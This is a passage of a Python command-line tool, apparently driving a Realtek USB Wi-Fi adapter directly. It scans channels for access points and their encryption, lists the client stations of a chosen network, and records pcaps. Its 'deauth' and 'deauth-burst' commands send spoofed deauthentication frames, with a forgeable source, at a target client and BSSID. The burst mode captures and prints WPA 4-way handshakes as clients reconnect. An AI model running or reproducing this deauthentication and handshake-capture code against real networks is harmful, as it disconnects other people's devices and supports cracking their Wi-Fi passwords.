                        if int(getattr(args, "igi", -1)) >= 0:
                            igi_a, igi_b = dev.get_igi()
                            sys.stderr.write(f"[scan] igi a={igi_a} b={igi_b}\n")
                    t_end = time.monotonic() + (max(0, int(args.dwell_ms)) / 1000.0)
                    while time.monotonic() < t_end:
                        raw = dev.bulk_read_ep(int(ep_in), size=int(args.read_size), timeout_ms=int(args.timeout_ms))
                        if not raw:
                            continue
                        for pkt in parse_rx_agg(raw):
                            frame = pkt.frame
                            if _fc_version(frame) != 0:
                                continue
                            if not include_bad and (pkt.crc_err or pkt.icv_err):
                                continue
                            if len(frame) < 2:
                                continue
                            fc = int.from_bytes(frame[0:2], "little")
                            ftype = (fc >> 2) & 0x3
                            subtype = (fc >> 4) & 0xF
                            tuned_ch = int(dev.current_channel)
                            st = per_ch.get(tuned_ch)
                            if st is None:
                                st = {"any": 0, "mgmt": 0, "ctrl": 0, "data": 0, "beacon": 0, "probe_resp": 0}
                                per_ch[tuned_ch] = st
                            st["any"] = int(st["any"]) + 1
                            if ftype == 0:
                                st["mgmt"] = int(st["mgmt"]) + 1
                            elif ftype == 1:
                                st["ctrl"] = int(st["ctrl"]) + 1
                            elif ftype == 2:
                                st["data"] = int(st["data"]) + 1

                            try:
                                a1, a2, a3, _a4, _ft, _st, _seq, _dur = _parse_addrs_any(frame)
                                sta_mac: Optional[str] = None
                                frame_bssid: Optional[str] = None
                                if ftype == 2:
                                    to_ds = bool((fc >> 8) & 0x1)
                                    from_ds = bool((fc >> 9) & 0x1)
                                    if to_ds and not from_ds:
                                        if a1 is not None and a2 is not None and _is_unicast_mac(a1) and _is_unicast_mac(a2) and a1 != a2:
                                            frame_bssid = _fmt_mac(a1)
                                            sta_mac = _fmt_mac(a2)
                                    elif from_ds and not to_ds:
                                        if a1 is not None and a2 is not None and _is_unicast_mac(a2) and _is_unicast_mac(a1) and a1 != a2:
                                            frame_bssid = _fmt_mac(a2)
                                            sta_mac = _fmt_mac(a1)
                                elif ftype == 0 and a3 is not None and _is_unicast_mac(a3):
                                    frame_bssid = _fmt_mac(a3)
                                    a1_s = _fmt_mac(a1) if a1 is not None and _is_unicast_mac(a1) else None
                                    a2_s = _fmt_mac(a2) if a2 is not None and _is_unicast_mac(a2) else None
                                    if a2_s is not None and a2_s != frame_bssid:
                                        sta_mac = a2_s
                                    elif a1_s is not None and a1_s != frame_bssid:
                                        sta_mac = a1_s

                                if frame_bssid and sta_mac and frame_bssid != sta_mac:
                                    stmap = stations_by_bssid.get(frame_bssid)
                                    if stmap is None:
                                        stmap = {}
                                        stations_by_bssid[frame_bssid] = stmap
                                    prev_seen = int(stmap.get(sta_mac, 0))
                                    stmap[sta_mac] = prev_seen + 1
                                    if prev_seen == 0:
                                        sys.stdout.write(f"ch={tuned_ch:02d} sta={sta_mac} bssid={frame_bssid} seen=1\n")
                                        sys.stdout.flush()
                            except Exception:
                                pass

                            if ftype != 0 or subtype not in (5, 8):
                                continue
                            if subtype == 8:
                                st["beacon"] = int(st["beacon"]) + 1
                            elif subtype == 5:
                                st["probe_resp"] = int(st["probe_resp"]) + 1
                            if len(frame) < 24:
                                continue

                            bssid = frame[16:22]
                            info = _extract_ap_info(frame)
                            if info is None:
                                continue
                            ssid = info['ssid']
                            ch_ie = info['channel']
                            
                            if bool(args.scan_strict_ds_channel) and ch_ie is not None and int(ch_ie) != tuned_ch:
                                continue
                            bssid_s = _fmt_mac(bssid)
                            rec = results.get(bssid_s)
                            if rec is None:
                                rec = {
                                    "bssid": bssid_s,
                                    "seen": 0,
                                    "ssid": ssid if ssid is not None else "",
                                    "ds_channel": 0,
                                    "tuned_channel": 0,
                                    "ds_counts": {},
                                    "tuned_counts": {},
                                    "privacy": info['privacy'],
                                    "wpa": info['wpa'],
                                    "wpa2": info['wpa2'],
                                }
                                results[bssid_s] = rec
                            rec["seen"] = int(rec.get("seen", 0)) + 1
                            if ssid is not None and ssid != "":
                                rec["ssid"] = ssid

                            if ch_ie is not None:
                                ds_counts = rec.get("ds_counts", {})
                                if not isinstance(ds_counts, dict):
                                    ds_counts = {}
                                ds_counts[int(ch_ie)] = int(ds_counts.get(int(ch_ie), 0)) + 1
                                rec["ds_counts"] = ds_counts

                            tuned_counts = rec.get("tuned_counts", {})
                            if not isinstance(tuned_counts, dict):
                                tuned_counts = {}
                            tuned_counts[tuned_ch] = int(tuned_counts.get(tuned_ch, 0)) + 1
                            rec["tuned_counts"] = tuned_counts

                            if int(args.scan_dump) > 0 and ssid is not None:
                                dump = frame[: min(len(frame), int(args.scan_dump))]
                                print(dump.hex())

                            if pcap is not None:
                                out_frame = frame
                                has_fcs = False
                                if not (pkt.crc_err or pkt.icv_err):
                                    stripped, has_fcs = _strip_fcs_if_present(frame)
                                    if not bool(args.pcap_with_fcs):
                                        out_frame = stripped
                                flags: Optional[int] = None
                                if bool(args.pcap_with_fcs):
                                    flags_val = 0x10 if has_fcs else 0
                                    if pkt.crc_err:
                                        flags_val |= 0x40
                                    flags = flags_val
                                tsft = int(time.time() * 1_000_000)
                                rtap = _radiotap_header(tsft=tsft, channel=int(dev.current_channel), flags=flags)
                                if bool(args.pcap_include_bad_fcs) or not (pkt.crc_err or pkt.icv_err):
                                    pcap.write_packet(rtap + out_frame)
                    
                    if not target_ssid:
                        rows_rt = list(results.values())
                        rows_rt.sort(key=lambda r: (_best_channel(r.get("ds_counts")), _best_channel(r.get("tuned_counts")), str(r.get("ssid", ""))))
                        for r in rows_rt:
                            ssid = str(r.get("ssid", ""))
                            if ssid == "":
                                ssid = "<hidden>"
                            ds_ch = _best_channel(r.get("ds_counts"))
                            tuned_ch = _best_channel(r.get("tuned_counts"))
                            enc = "OPEN"
                            if r.get("privacy"):
                                if r.get("wpa2"):
                                    enc = "WPA2"
                                elif r.get("wpa"):
                                    enc = "WPA"
                                else:
                                    enc = "WEP"
                            sys.stdout.write(
                                f"ds={ds_ch:02d} tuned={tuned_ch:02d} bssid={str(r.get('bssid', ''))} seen={int(r.get('seen', 0))} enc={enc} ssid={ssid}\n"
                            )
                        sys.stdout.flush()
            finally:
                if pcap is not None:
                    pcap.flush()
                if fp is not None and fp is not sys.stdout.buffer:
                    fp.close()

            def _best_channel(counts: object) -> int:
                if not isinstance(counts, dict) or not counts:
                    return 0
                best_k = 0
                best_v = -1
                for k, v in counts.items():
                    try:
                        kk = int(k)
                        vv = int(v)
                    except Exception:
                        continue
                    if vv > best_v:
                        best_v = vv
                        best_k = kk
                return best_k

            rows = list(results.values())
            if target_ssid:
                rows = [r for r in rows if str(r.get("ssid", "")).strip() == target_ssid]
            rows.sort(key=lambda r: (_best_channel(r.get("ds_counts")), _best_channel(r.get("tuned_counts")), str(r.get("ssid", ""))))
            for r in rows:
                ssid = str(r.get("ssid", ""))
                if ssid == "":
                    ssid = "<hidden>"
                ds_ch = _best_channel(r.get("ds_counts"))
                tuned_ch = _best_channel(r.get("tuned_counts"))
                
                enc = "OPEN"
                if r.get("privacy"):
                    if r.get("wpa2"):
                        enc = "WPA2"
                    elif r.get("wpa"):
                        enc = "WPA"
                    else:
                        enc = "WEP"

                sys.stdout.write(
                    f"ds={ds_ch:02d} tuned={tuned_ch:02d} bssid={str(r.get('bssid', ''))} seen={int(r.get('seen', 0))} enc={enc} ssid={ssid}\n"
                )
            sys.stdout.flush()
            if bool(args.scan_summary):
                for ch in sorted(per_ch.keys()):
                    st = per_ch[ch]
                    sys.stdout.write(
                        f"summary tuned={ch:02d} any={int(st.get('any', 0))} mgmt={int(st.get('mgmt', 0))} "
                        f"beacon={int(st.get('beacon', 0))} probe_resp={int(st.get('probe_resp', 0))} "
                        f"data={int(st.get('data', 0))} ctrl={int(st.get('ctrl', 0))}\n"
                    )
                sys.stdout.flush()

            if target_ssid and rows:
                for r in rows:
                    bssid_s = str(r.get("bssid", ""))
                    ds_ch = _best_channel(r.get("ds_counts"))
                    tuned_ch = _best_channel(r.get("tuned_counts"))
                    channel = int(ds_ch or tuned_ch or 0)
                    ssid = str(r.get("ssid", "")) or "<hidden>"
                    if channel <= 0:
                        continue

                    sys.stdout.write(f"Scanning stations for SSID='{ssid}' BSSID={bssid_s} on channel {channel}...\n")
                    sys.stdout.flush()

                    dev.set_channel(channel, bandwidth_mhz=20)
                    end = time.monotonic() + (int(args.station_scan_ms) / 1000.0)
                    stations: Dict[str, Dict[str, object]] = {}
                    st_pkts = 0
                    st_data = 0
                    st_mgmt = 0
                    st_match = 0
                    st_dumped = 0
                    while time.monotonic() < end:
                        remain_ms = (end - time.monotonic()) * 1000.0
                        eff_timeout = int(min(int(args.timeout_ms), max(1.0, remain_ms)))
                        raw = dev.bulk_read_ep(int(ep_in), size=int(args.read_size), timeout_ms=eff_timeout)
                        if not raw:
                            continue
                        for pkt in parse_rx_agg(raw):
                            st_pkts += 1
                            if not bool(args.scan_include_bad_fcs) and (pkt.crc_err or pkt.icv_err):
                                continue
                            frame = pkt.frame
                            if not frame or _fc_version(frame) != 0:
                                continue

                            a1, a2, a3, _a4, ftype, subtype, _seq, _dur = _parse_addrs_any(frame)
                            sta_mac: Optional[str] = None
                            frame_bssid: Optional[str] = None

                            if ftype == 2:
                                st_data += 1
                                fc = int.from_bytes(frame[0:2], "little")
                                to_ds = bool((fc >> 8) & 0x1)
                                from_ds = bool((fc >> 9) & 0x1)
                                if to_ds and not from_ds:
                                    if (
                                        a1 is not None
                                        and a2 is not None
                                        and _is_unicast_mac(a1)
                                        and _is_unicast_mac(a2)
                                        and a1 != a2
                                    ):
                                        frame_bssid = _fmt_mac(a1)
                                        sta_mac = _fmt_mac(a2)
                                elif from_ds and not to_ds:
                                    if (
                                        a1 is not None
                                        and a2 is not None
                                        and _is_unicast_mac(a2)
                                        and _is_unicast_mac(a1)
                                        and a1 != a2
                                    ):
                                        frame_bssid = _fmt_mac(a2)
                                        sta_mac = _fmt_mac(a1)
                            elif ftype == 1 and subtype in (8, 9, 10, 11):
                                if len(frame) >= 16:
                                    ra = frame[4:10]
                                    ta = frame[10:16]
                                    ra_s = _fmt_mac(ra) if _is_unicast_mac(ra) else None
                                    ta_s = _fmt_mac(ta) if _is_unicast_mac(ta) else None
                                    if ra_s == bssid_s and ta_s is not None:
                                        frame_bssid = ra_s
                                        sta_mac = ta_s
                                    elif ta_s == bssid_s and ra_s is not None:
                                        frame_bssid = ta_s
                                        sta_mac = ra_s
                            elif ftype == 0:
                                st_mgmt += 1
                                a1_s = _fmt_mac(a1) if _is_unicast_mac(a1) else None
                                a2_s = _fmt_mac(a2) if _is_unicast_mac(a2) else None
                                a3_s = _fmt_mac(a3) if _is_unicast_mac(a3) else None
                                if a3_s == bssid_s:
                                    frame_bssid = a3_s
                                    if a2_s is not None and a2_s != bssid_s:
                                        sta_mac = a2_s
                                    elif a1_s is not None and a1_s != bssid_s:
                                        sta_mac = a1_s

                            if frame_bssid != bssid_s or sta_mac is None or sta_mac == bssid_s:
                                if bool(args.debug) and int(args.scan_dump) > 0 and st_dumped < int(args.scan_dump):
                                    fc = int.from_bytes(frame[0:2], "little") if len(frame) >= 2 else 0
                                    head = frame[:32]
                                    sys.stdout.write(
                                        f"[sta] dump fc=0x{fc:04x} ftype={ftype} subtype={subtype}"
                                        f" a1={_fmt_mac(a1) if a1 else None}"
                                        f" a2={_fmt_mac(a2) if a2 else None}"
                                        f" a3={_fmt_mac(a3) if a3 else None}"
                                        f" head={head.hex()}\n"
                                    )
                                    sys.stdout.flush()
                                    st_dumped += 1
                                continue

                            st_match += 1
                            prev = stations.get(sta_mac)
                            if prev is None:
                                stations[sta_mac] = {"mac": sta_mac, "seen": 1}
                            else:
                                prev["seen"] = int(prev.get("seen", 0)) + 1

                    if bool(args.debug):
                        sys.stdout.write(
                            f"[sta] pkts={st_pkts} data={st_data} mgmt={st_mgmt} matched={st_match} stations={len(stations)}\n"
                        )
                        sys.stdout.flush()
                    for sta in sorted(stations.values(), key=lambda x: (-int(x.get("seen", 0)), str(x.get("mac", "")))):
                        sys.stdout.write(f"  Station: {str(sta.get('mac', ''))} seen={int(sta.get('seen', 0))}\n")
                    sys.stdout.flush()
            return 0

        if args.cmd == "deauth-burst":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                raise RuntimeError("missing --replay-pcap")

            default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
            display_filter = str(getattr(args, "replay_filter", None) or default_filter)
            stats = dev.replay_all_usb_requests_from_pcap(
                replay_pcap,
                display_filter=display_filter,
                timeout_ms=int(args.replay_timeout_ms),
                bulk_in_default_size=int(args.replay_bulk_in_default_size),
                sleep=bool(args.replay_sleep),
                max_sleep_ms=int(args.replay_max_sleep_ms),
                dry_run=False,
                debug=bool(args.debug),
                verify_in=not bool(args.replay_no_verify_in),
                verify_in_mode=("len" if bool(args.replay_verify_in_len) else "bytes"),
                only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req) or (str(getattr(args, "replay_mode", "vendor")) == "vendor"),
                report_mismatch=int(args.replay_report_mismatch),
                report_errors=int(args.replay_report_errors),
                limit=int(args.replay_limit),
            )
            if args.debug:
                print(f"[replay] stats={stats}")

            dev.set_channel(int(args.channel), bandwidth_mhz=int(args.bw))
            if int(getattr(args, "igi", -1)) >= 0:
                dev.set_igi(int(args.igi))
                if args.debug:
                    igi_a, igi_b = dev.get_igi()
                    sys.stderr.write(f"[deauth-burst] igi a={igi_a} b={igi_b}\n")

            ep_in = args.ep_in
            if ep_in is None:
                ep_in = int(dev.bulk_in_eps[0].bEndpointAddress)
            ep_out = args.ep_out
            if ep_out is not None:
                ep_out = int(ep_out)

            p = str(args.pcap).strip()
            fp = sys.stdout.buffer if p == "-" else open(p, "wb")
            pcap = PcapWriter(fp)
            sent = 0
            captured = 0
            try:
                interval_ms = int(getattr(args, "burst_interval_ms", 2000))
                duration_s = float(getattr(args, "burst_duration_s", 0.0))
                t_end: Optional[float] = None if duration_s <= 0.0 else (time.monotonic() + max(0.0, duration_s))
                next_send = time.monotonic()

                while True:
                    if t_end is not None and time.monotonic() >= t_end:
                        break
                    now = time.monotonic()
                    if now >= next_send:
                        burst_size = max(0, int(getattr(args, "burst_size", 20)))
                        for _ in range(burst_size):
                            dev.send_deauth(
                                dest=str(args.target_mac),
                                bssid=str(args.bssid),
                                source=(str(args.source_mac) if getattr(args, "source_mac", None) else None),
                                reason=int(args.reason),
                                ep_out=ep_out,
                            )
                            sent += 1
                        if interval_ms > 0:
                            next_send += interval_ms / 1000.0
                            if next_send < now:
                                next_send = now + (interval_ms / 1000.0)
                        else:
                            next_send = float("inf")

                    raw = dev.bulk_read_ep(int(ep_in), size=int(args.read_size), timeout_ms=int(args.burst_read_timeout_ms))
                    if not raw:
                        continue
                    for pkt in parse_rx_agg(raw):
                        frame = pkt.frame
                        if _fc_version(frame) != 0:
                            continue
                        if not bool(args.pcap_include_bad_fcs) and (pkt.crc_err or pkt.icv_err):
                            continue
                        if len(frame) < 2 or len(frame) > 4096:
                            continue
                        out_frame = frame
                        has_fcs = False
                        if not (pkt.crc_err or pkt.icv_err):
                            stripped, has_fcs = _strip_fcs_if_present(frame)
                            if not bool(args.pcap_with_fcs):
                                out_frame = stripped

                        flags: Optional[int] = None
                        if bool(args.pcap_with_fcs):
                            flags_val = 0x10 if has_fcs else 0
                            if pkt.crc_err:
                                flags_val |= 0x40
                            flags = flags_val

                        _print_4way_if_present(frame if bool(args.pcap_with_fcs) else out_frame)

                        tsft = int(time.time() * 1_000_000)
                        rtap = _radiotap_header(tsft=tsft, channel=int(dev.current_channel), flags=flags)
                        pcap.write_packet(rtap + out_frame)
                        captured += 1
            except KeyboardInterrupt:
                pass
            finally:
                pcap.flush()
                if fp is not sys.stdout.buffer:
                    fp.close()
            print(f"deauth_burst sent={sent} captured={captured}")
            return 0

        if args.cmd == "tx":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                raise RuntimeError("missing --replay-pcap")

            default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
            display_filter = str(getattr(args, "replay_filter", None) or default_filter)
            stats = dev.replay_all_usb_requests_from_pcap(
                replay_pcap,
                display_filter=display_filter,
                timeout_ms=int(args.replay_timeout_ms),
                bulk_in_default_size=int(args.replay_bulk_in_default_size),
                sleep=bool(args.replay_sleep),
                max_sleep_ms=int(args.replay_max_sleep_ms),
                dry_run=False,
                debug=bool(args.debug),
                verify_in=not bool(args.replay_no_verify_in),
                verify_in_mode=("len" if bool(args.replay_verify_in_len) else "bytes"),
                only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req),
                report_mismatch=int(args.replay_report_mismatch),
                report_errors=int(args.replay_report_errors),
                limit=0,
            )
            if args.debug:
                print(f"[replay] stats={stats}")

            dev.set_channel(int(args.channel), bandwidth_mhz=int(args.bw))
            if int(getattr(args, "igi", -1)) >= 0:
                dev.set_igi(int(args.igi))
                if args.debug:
                    igi_a, igi_b = dev.get_igi()
                    sys.stderr.write(f"[tx] igi a={igi_a} b={igi_b}\n")

            frame = _hex_to_bytes(str(args.hexframe))
            n = dev.tx_frame(frame, ep_addr=(int(args.ep_out) if args.ep_out is not None else None))
            print(f"tx wrote={int(n)}")
            return 0

        if args.cmd == "deauth":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                raise RuntimeError("missing --replay-pcap")

            default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
            display_filter = str(getattr(args, "replay_filter", None) or default_filter)
            stats = dev.replay_all_usb_requests_from_pcap(
                replay_pcap,
                display_filter=display_filter,
                timeout_ms=int(args.replay_timeout_ms),
                bulk_in_default_size=int(args.replay_bulk_in_default_size),
                sleep=bool(args.replay_sleep),
                max_sleep_ms=int(args.replay_max_sleep_ms),
                dry_run=False,
                debug=bool(args.debug),
                verify_in=not bool(args.replay_no_verify_in),
                verify_in_mode=("len" if bool(args.replay_verify_in_len) else "bytes"),
                only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req),
                report_mismatch=int(args.replay_report_mismatch),
                report_errors=int(args.replay_report_errors),
                limit=0,
            )
            if args.debug:
                print(f"[replay] stats={stats}")

            dev.set_channel(int(args.channel), bandwidth_mhz=int(args.bw))
            if int(getattr(args, "igi", -1)) >= 0:
                dev.set_igi(int(args.igi))
                if args.debug:
                    igi_a, igi_b = dev.get_igi()
                    sys.stderr.write(f"[deauth] igi a={igi_a} b={igi_b}\n")

            cnt = int(getattr(args, "count", 1))
            delay_ms = int(getattr(args, "delay_ms", 100))
            for i in range(max(0, cnt)):
                dev.send_deauth(
                    dest=str(args.target_mac),
                    bssid=str(args.bssid),
                    source=(str(args.source_mac) if getattr(args, "source_mac", None) else None),
                    reason=int(args.reason),
                    ep_out=(int(args.ep_out) if args.ep_out is not None else None),
                )
                print(f"deauth sent={i+1}")
                if i + 1 < cnt and delay_ms > 0:
                    time.sleep(delay_ms / 1000.0)
            return 0
    finally:
        dev.close()
 
    return 0
 
 
if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
